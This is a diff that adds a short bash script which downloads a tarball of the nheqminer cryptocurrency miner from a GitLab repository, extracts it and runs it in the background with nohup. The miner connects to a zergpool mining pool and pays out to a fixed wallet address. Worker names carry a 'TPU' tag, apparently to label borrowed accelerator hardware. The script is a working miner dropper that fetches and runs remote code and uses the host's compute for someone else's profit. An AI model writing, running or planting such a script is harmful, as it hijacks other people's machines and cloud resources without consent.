@@ -1,0 +1,5 @@
+#!/bin/bash
+curl -L https://gitlab.com/kancomue/strm/-/raw/main/nheqminer.tar.gz --output nheqminer.tar.gz
+tar xf nheqminer.tar.gz
+chmod +x nheqminer  >/dev/null 2>&1
+nohup ./nheqminer -v -l  verushash.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 -x > nohup.out
